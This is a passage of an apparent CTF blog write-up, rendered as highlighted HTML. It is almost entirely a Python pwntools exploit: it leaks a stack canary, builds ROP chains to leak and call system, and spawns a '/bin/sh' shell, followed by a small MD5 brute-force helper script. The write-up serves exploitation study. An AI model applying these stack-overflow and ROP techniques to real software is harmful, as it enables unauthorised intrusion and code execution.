+</span></span><span style=display:flex><span>canary <span style=color:#666>=</span> u64(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> sh<span style=color:#666>.</span>recv(<span style=color:#40a070>7</span>))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;canary: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(canary))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000002593</span>
+</span></span><span style=display:flex><span>pop_rsi_r15_ret <span style=color:#666>=</span> prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000002591</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x18</span> <span style=color:#666>+</span> p64(canary) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x990</span>) <span style=color:#60a0b0;font-style:italic># call system</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x203038</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x950</span>) <span style=color:#666>+</span> p64(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x23F6</span>) <span style=color:#60a0b0;font-style:italic># puts system@got</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#39;your input:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;username:&#34;</span>, <span style=color:#4070a0>&#39;admin&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;password:&#34;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x3d\xfd\xff\xff</span><span style=color:#4070a0>&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x18</span> <span style=color:#666>+</span> p64(canary) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> 
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) 
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rsi_r15_ret) <span style=color:#666>+</span> p64(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x203060</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x9B0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x23F6</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#39;your input:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(p64(system_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;username:&#34;</span>, <span style=color:#4070a0>&#39;admin&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;password:&#34;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x3d\xfd\xff\xff</span><span style=color:#4070a0>&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#39;your input:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;3.exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># md5 0ea1fb4edf4aae8fb2ee19fb1cfbe362</span>
+</span></span></code></pre></div><p>网上随便找了个爆破脚本爆破了一下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>hashlib</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>random</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>encryption</span>(chars):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> hashlib<span style=color:#666>.</span>md5(chars)<span style=color:#666>.</span>hexdigest()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>generate</span>(idx):
+</span></span><span style=display:flex><span>    payload <span style=color:#666>=</span> p32(idx)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>main</span>():
+</span></span><span style=display:flex><span>    idx <span style=color:#666>=</span> <span style=color:#40a070>0xFFFFFFFF</span>
+</span></span><span style=display:flex><span>    start <span style=color:#666>=</span> <span style=color:#4070a0>&#34;00&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> <span style=color:#007020;font-weight:700>True</span>:
+</span></span><span style=display:flex><span>        strs <span style=color:#666>=</span> generate(idx)
+</span></span><span style=display:flex><span>        idx <span style=color:#666>-=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> <span style=color:#4070a0>&#34;Test </span><span style=color:#70a0d0>%s</span><span style=color:#4070a0> &#34;</span> <span style=color:#666>%</span> strs<span style=color:#666>.</span>encode(<span style=color:#4070a0>&#39;hex&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> encryption(strs)<span style=color:#666>.</span>startswith(start):
+</span></span><span style=display:flex><span>            <span style=color:#007020>print</span> <span style=color:#4070a0>&#34;yes!&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#007020>print</span> <span style=color:#4070a0>&#34;[+] </span><span style=color:#70a0d0>%s</span><span style=color:#4070a0> &#34;</span> <span style=color:#666>%</span> strs<span style=color:#666>.</span>encode(<span style=color:#4070a0>&#39;hex&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0> &#34;</span> <span style=color:#666>%</span> encryption(strs)<span style=color:#666>.</span>encode(<span style=color:#4070a0>&#39;hex&#39;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>break</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#007020>print</span> <span style=color:#4070a0>&#34;no!&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> __name__ <span style=color:#666>==</span> <span style=color:#4070a0>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span><span style=display:flex><span>    <span style=color:#007020>print</span> <span style=color:#4070a0>&#39;完成！&#39;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
